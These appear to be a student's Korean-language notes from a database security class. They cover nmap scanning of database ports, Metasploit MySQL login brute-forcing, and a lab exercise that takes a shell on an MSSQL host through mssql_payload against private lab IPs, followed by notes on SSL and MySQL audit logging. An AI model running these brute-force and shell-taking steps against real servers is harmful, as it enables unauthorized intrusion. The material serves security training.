nmap -p 1433,3306,1521 -sV 192 168 63 128
msfconsole

오 .. 괜찮은 metaxploit 모델 물어보기

mysql_login / schema_login /hashdump/escalate_dbowner

**수업 끝나고 정리 필요!

> search mysql
> use auxiliary/scanner/mysql/mysql_login
> >show options -> 공격값에 옵션들 보기
> >// required yes라고 되어있으면 반드시 설정해야함
> 
> set user_file /root/Desktop/user.txt
> set user_file /root/Desktop/pass.txt
> set rhosts 192.168.63.128
> set stop_on_success true
> run



해당 시스템의 쉘을 탈취하는 실습
1. use exploit/windows/mssql/mssql_payload
2. set rhost 192.168.63.128
3. set password qwer1234
4. set srvhost 192.168.63.133
5. set METHOD old
6. run


---
alter user 'webapp'@'192.168.(ip)' REQUIRE SSL;
mysql -h (공격자ip) -u webapp -p --ssl-mode=REQUIRED

---

감사 로깅(audit logging)
- 클라우드 취약점_점검_가이드
- General log 확인
- Slow log 확인


**mysql 로그**
- myslqd.log 
	-  서버 기동, 정지, 오류, 접속 실패
		실행 시 자동으로 켜짐
- general_log
	- 일반 쿼리 로그
	- sql문 전수 기록
	- 성능에 영향이 있고, 보안에 취약(sql 평문 노출)
- slow_query_log
	- long_query_time
	- 데이터 처리량이 많거나 요청 응답 초과 쿼리
	- 저부하로 성능에 영향 미미
- 감사 로그(audit plugin)
	- 강력 추천


